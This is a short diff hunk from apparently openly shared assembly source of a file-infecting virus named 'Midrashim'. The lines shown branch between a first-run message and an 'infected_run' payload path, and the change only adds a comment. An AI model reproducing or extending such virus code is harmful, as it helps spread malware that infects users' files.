@@ -322,7 +322,7 @@ v_start:
     jnz infected_run                                            ; if control flag != 1, it should be running from an infected file, use normal payload
         call show_msg                                           ; if control flag == 1, assume virus is being executed for the first time and display a different message
         info_msg:
-            db 'Midrashim by TMZ (c) 2020', 0xa
+            db 'Midrashim by TMZ (c) 2020', 0xa                 ; not the nicest approach like I mentioned before but quick to implement
             info_len = $-info_msg
         show_msg:            
             pop rsi                                             ; info_msg address to rsi
